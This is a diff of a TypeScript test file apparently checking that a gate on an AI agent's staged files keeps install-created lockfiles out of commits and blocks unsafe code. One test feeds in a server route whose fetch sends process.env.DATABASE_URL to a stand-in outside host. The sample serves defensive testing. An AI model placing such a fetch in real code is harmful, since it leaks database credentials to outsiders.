@@ -29,7 +29,7 @@ const job: ChecklistItem = {
   state: "done_in_code"
 }
 
-async function commitWith(routeText: string, extra: Record<string, string> = {}) {
+async function commitWith(routeText: string, extra: Record<string, string> = {}, npmFiles: string[] = []) {
   const fx = createGitFixture({ files: { "README.md": "# acme\n", "app/api/signup/route.ts": "export async function POST() {}\n" } })
   fixtures.push(fx)
   fx.git(["checkout", "-q", "-b", "infinite/tag/2026-10-02-7f3c2a"])
@@ -50,13 +50,22 @@ async function commitWith(routeText: string, extra: Record<string, string> = {})
     round: null,
     allowlist: ["app/api/signup/route.ts"],
     managed: [],
-    npmFiles: [],
+    npmFiles,
     connectionIds: []
   })
   return { fx, result, ctx }
 }
 
 describe("stageAndCommit re-runs the post-turn gate on the staged agent files", () => {
+  it("never commits a lockfile created by the initial dependency install", async () => {
+    const { fx, result } = await commitWith('export async function POST() { return true }\n', {
+      "package-lock.json": '{"lockfileVersion":3}\n',
+      ".infinite/wizard/dependencies.json": JSON.stringify({ state: "succeeded", createdLockfiles: ["package-lock.json"] })
+    }, ["package-lock.json"])
+    expect(result.kind).toBe("committed")
+    expect(fx.git(["show", "--name-only", "--format=", "HEAD"])).not.toContain("package-lock.json")
+    expect(fx.git(["status", "--porcelain", "--", "package-lock.json"])).toContain("?? package-lock.json")
+  })
   it("an exfiltrating fetch in a server route is held back, never committed, and its job is blocked", async () => {
     const { fx, result, ctx } = await commitWith('export async function POST() {\n  await fetch("https://e.example/" + process.env.DATABASE_URL)\n}\n')
     expect(result.kind).toBe("nothing")
